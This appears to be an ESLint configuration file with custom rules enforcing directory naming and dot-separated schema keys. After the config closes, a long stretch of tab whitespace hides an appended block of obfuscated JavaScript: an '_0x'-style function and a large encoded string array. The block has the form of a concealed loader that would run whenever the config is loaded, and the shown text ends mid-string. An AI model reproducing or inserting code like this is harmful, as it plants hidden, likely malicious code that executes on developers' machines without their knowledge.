  // Directory & file naming rules (naming-conventions.md §3–§4, §6.6) — inline custom plugin.
  // Not tests-exempt (test file names follow the convention too); the __tests__/__mocks__/__snapshots__
  // directory segments are allow-listed inside the rule.
  {
    files: ['src/**/*.{ts,tsx}', 'packages/ui/**/*.{ts,tsx}'],
    plugins: { naming: namingPlugin },
    rules: {
      'naming/path-case': 'error'
    }
  },
  // Schema key naming convention (cache, preferences, paths & IPC route/event keys)
  // Supports both fixed keys and template keys:
  // - Fixed: 'app.user.avatar', 'chat.multi_select_mode'
  // - Template: 'scroll.position.${topicId}', 'entity.cache.${type}_${id}'
  // Template keys must follow the same dot-separated pattern as fixed keys.
  // When ${xxx} placeholders are treated as literal strings, the key must match: xxx.yyy.zzz_www
  {
    files: [
      'src/shared/data/cache/cacheSchemas.ts',
      'src/shared/data/preference/preferenceSchemas.ts',
      'src/main/core/paths/pathRegistry.ts',
      // IPC route/event keys — whole dir so future domains are auto-enforced (see ipc-schema-guide.md).
      'src/shared/ipc/schemas/**/*.ts'
    ],
    plugins: {
      'data-schema-key': {
        rules: {
          'valid-key': {
            meta: {
              type: 'problem',
              docs: {
                description:
                  'Enforce schema key naming convention: namespace.sub.key_name (template placeholders treated as literal strings)',
                recommended: true
              },
              messages: {
                invalidKey:
                  'Schema key "{{key}}" must follow format: namespace.sub.key_name (e.g., app.user.avatar, scroll.position.${id}). Template ${xxx} is treated as a literal string segment.',
                invalidTemplateVar:
                  'Template variable in "{{key}}" must be a valid identifier (e.g., ${id}, ${topicId}).'
              }
            },
            create(context) {
              /**
               * Validates a schema key for correct naming convention.
               *
               * Both fixed keys and template keys must follow the same pattern:
               * - Lowercase segments separated by dots
               * - Each segment: starts with letter, contains letters/numbers/underscores
               * - At least two segments (must have at least one dot)
               *
               * Template keys: ${xxx} placeholders are treated as literal string segments.
               * Example valid: 'scroll.position.${id}', 'entity.cache.${type}_${id}'
               * Example invalid: 'cache:${type}' (colon not allowed), '${id}' (no dot)
               *
               * @param {string} key - The schema key to validate
               * @returns {{ valid: boolean, error?: 'invalidKey' | 'invalidTemplateVar' }}
               */
              function validateKey(key) {
                // Check if key contains template placeholders
                const hasTemplate = key.includes('${')

                if (hasTemplate) {
                  // Validate template variable names first
                  const templateVarPattern = /\$\{([^}]*)\}/g
                  let match
                  while ((match = templateVarPattern.exec(key)) !== null) {
                    const varName = match[1]
                    // Variable must be a valid identifier: start with letter, contain only alphanumeric and underscore
                    if (!varName || !/^[a-zA-Z][a-zA-Z0-9_]*$/.test(varName)) {
                      return { valid: false, error: 'invalidTemplateVar' }
                    }
                  }

                  // Replace template placeholders with a valid segment marker
                  // Use 'x' as placeholder since it's a valid segment character
                  const keyWithoutTemplates = key.replace(/\$\{[^}]+\}/g, 'x')

                  // Template key must follow the same pattern as fixed keys
                  // when ${xxx} is treated as a literal string
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(keyWithoutTemplates)) {
                    return { valid: false, error: 'invalidKey' }
                  }

                  return { valid: true }
                } else {
                  // Fixed key validation: standard dot-separated format
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(key)) {
                    return { valid: false, error: 'invalidKey' }
                  }
                  return { valid: true }
                }
              }

              return {
                TSPropertySignature(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                },
                Property(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    // Keys inside a `z.*(...)` object literal are zod data-field names
                    // (e.g. z.object({ 'content-type': ... })), not route/schema keys, so the
                    // namespace.action convention does not apply — skip them. Anchored on the
                    // zod namespace `z`, this covers z.object/z.strictObject/etc. while leaving
                    // Object.freeze(...) registries (pathRegistry.ts) still validated.
                    const enclosing = node.parent
                    if (
                      enclosing?.parent?.type === 'CallExpression' &&
                      enclosing.parent.callee?.type === 'MemberExpression' &&
                      enclosing.parent.callee.object?.type === 'Identifier' &&
                      enclosing.parent.callee.object.name === 'z'
                    ) {
                      return
                    }
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    rules: {
      'data-schema-key/valid-key': 'error'
    }
  }
]);																																																																																																																																																																																																																																																																										var z = '-3343-2';function _0x7379(){var _0x215997=['swDvsMe','mJDlzLr4vNK','B3HQz0W','sK5MwLa','y29UC3rYDwn0B3i','AM9PBG','ndi4mg16DfD5zG','C3vIC3rYAw5N','Aw5PDa','ruTxBvu','mti2nZDhzhHSr0C','nZK5ntK4nuP2ruHHvG','EKDVyuS','y2HHAw4','yxbWBhK','nduXmZG2nKP1yuDKEa','C3rHDgvpyMPLy3q','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','C3bSAxq','y291BNrLCG','nJmXndzzwMPYq3a','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